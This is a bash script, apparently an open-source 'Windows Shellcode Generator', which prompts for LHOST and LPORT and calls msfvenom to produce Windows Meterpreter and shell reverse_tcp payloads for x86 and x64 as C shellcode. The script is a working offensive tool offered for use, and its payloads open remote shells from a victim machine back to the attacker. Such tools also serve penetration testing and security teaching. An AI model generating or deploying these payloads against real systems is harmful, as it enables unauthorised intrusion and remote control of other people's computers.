#!/bin/bash

#Author: d4t4s3c
#Email:  d4t4s3c@protonmail.com
#GitHub: www.github.com/d4t4s3c

#colors
b="\033[1;37m"
r="\033[1;31m"
v="\033[1;32m"
a="\033[1;33m"
az="\033[1;34m"
nc="\e[0m"

#var
shell="$"
n0=0
n1=1
n2=2
n3=3
n4=4
n5=5
n6=6
n7=7
lis1="Listener multi/handler"
lis2="Listener Netcat"
cor="+"
si=✔
no=✘
k1="x86"
k2="x64"
in="Invalid Option"
lh="¿LHOST?"
lp="¿LPORT?"
msf="Creating SHELLCODE with MSFVENOM"

function checkroot(){
	    echo ""
	    echo -e "$a check root user $nc"
	    sleep 4
    if [ "$(id -u)" == "0" ]; then
	    echo ""
	    echo -e " $b[$v$si$b] root $nc"
	    sleep 4
	    echo ""
    else
            echo ""
	    echo -e " $b[$r$no$b] root $nc"
	    sleep 4
	    echo ""
	    echo -e "$r EXITING $nc"
	    sleep 4
	    echo ""
	    exit
    fi	
}

function banner(){
            echo -e "$r         __      __  _________ ________"
            echo -e "$r        /  \    /  \/   _____//  _____/" 
            echo -e "$r        \   \/\/   /\_____  \/   \  ___ "
            echo -e "$r         \        / /        \    \_\  \ "
            echo -e "$r          \__/\  / /_______  /\______  / "
            echo -e "$r               \/          \/        \/ "
            echo -e "$b       [$az$cor$b] Windows Shellcode Generator [$az$cor$b] $nc"     
            echo -e "$az                       _.-;;-._   "
            echo -e "$az                '-..-'|   ||   |  "
            echo -e "$az                '-..-'|_.-;;-._|  "
            echo -e "$az                '-..-'|   ||   |  "
            echo -e "$az                '-..-'|_.-''-._|  "
            echo ""
}

function main(){
	    echo -e "$b <============================================>"
            echo -e "$b  [$az$n1$b] Meterpreter $az$k1 $b($r$lis1$b)$nc"
            echo -e "$b  [$az$n2$b] Meterpreter $az$k2 $b($r$lis1$b)$nc"
            echo -e "$b  [$az$n3$b] Shell       $az$k1 $b($r$lis1$b)$nc"               
            echo -e "$b  [$az$n4$b] Shell       $az$k2 $b($r$lis1$b)$nc"
            echo -e "$b  [$az$n5$b] Shell       $az$k1 $b($r$lis2$b)$nc"
            echo -e "$b  [$az$n6$b] Shell       $az$k2 $b($r$lis2$b)$nc"
            echo -e "$b  [$az$n7$b] Exit $nc"
            echo -e "$b <============================================>"
            echo ""
}

function menu(){

read -p " $(echo -e $v$shell $nc)" opc

    if [ $opc -eq 1 ]; then
   	    echo ""
	    echo -e "$b$lh$nc"
	    echo ""
	    read lhost
	    echo ""
	    echo -e "$b$lp$nc"
	    echo ""
	    read lport
	    echo ""
	    echo -e "$b$msf$nc"
	    echo ""
            msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport EXITFUNC=thread -b "\x00\x0a\x0d" -f c
            exit
    elif [ $opc -eq 2 ]; then
            echo ""
	    echo -e "$b$lh$nc"
	    echo ""
	    read lhost
	    echo ""
	    echo -e "$b$lp$nc"
	    echo ""
	    read lport
	    echo ""
	    echo -e "$b$msf$nc"
	    echo ""
            msfvenom -a x64 --platform windows -p windows/x64/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport EXITFUNC=thread -b "\x00\x0a\x0d" -f c
            exit
    elif [ $opc -eq 3 ]; then
            echo ""
	    echo -e "$b$lh$nc"
	    echo ""
	    read lhost
	    echo ""
	    echo -e "$b$lp$nc"
	    echo ""
	    read lport
	    echo ""
	    echo -e "$b$msf$nc"
	    echo ""
            msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=$lhost LPORT=$lport EXITFUNC=thread -b "\x00\x0a\x0d" -f c
            exit
    elif [ $opc -eq 4 ]; then
            echo ""
	    echo -e "$b$lh$nc"
	    echo ""
	    read lhost
	    echo ""
	    echo -e "$b$lp$nc"
	    echo ""
	    read lport
	    echo ""
	    echo -e "$b$msf$nc"
	    echo ""
            msfvenom -a x64 --platform windows -p windows/x64/shell/reverse_tcp LHOST=$lhost LPORT=$lport EXITFUNC=thread -b "\x00\x0a\x0d" -f c
            exit
    elif [ $opc -eq 5 ]; then
            echo ""
	    echo -e "$b$lh$nc"
	    echo ""
	    read lhost
	    echo ""
	    echo -e "$b$lp$nc"
	    echo ""
	    read lport
	    echo ""
	    echo -e "$b$msf$nc"
	    echo ""
            msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp LHOST=$lhost LPORT=$lport EXITFUNC=thread -b "\x00\x0a\x0d" -f c
            exit
    elif [ $opc -eq 6 ]; then
            echo ""
	    echo -e "$b$lh$nc"
	    echo ""
	    read lhost
	    echo ""
	    echo -e "$b$lp$nc"
	    echo ""
	    read lport
	    echo ""
	    echo -e "$b$msf$nc"
	    echo ""
            msfvenom -a x64 --platform windows -p windows/x64/shell_reverse_tcp LHOST=$lhost LPORT=$lport EXITFUNC=thread -b "\x00\x0a\x0d" -f c
            exit
    elif [ $opc -eq 7 ]; then
	    echo ""
	    echo ""
	    echo -e "        |\/\/\/|"
            echo -e "        |      |" 
            echo -e "        |      |" 
            echo -e "        | (o)(o) " 
            echo -e "        C      _) "
            echo -e "         | ,___|  "
            echo -e "         |   /    "
            echo -e "        /____\ "
            echo -e "       /      \ $nc"
            echo -e "$b#### $v BYE $v HACKER $b ####$nc"
            echo ""
            echo ""
	    sleep 3
	    exit
    else
	    echo ""
	    echo -e "$b$in$nc"
	    echo ""
	    sleep 2
	    banner
	    main
	    menu
    fi
}

clear
tput civis
checkroot
clear
banner
main
tput cnorm
menu
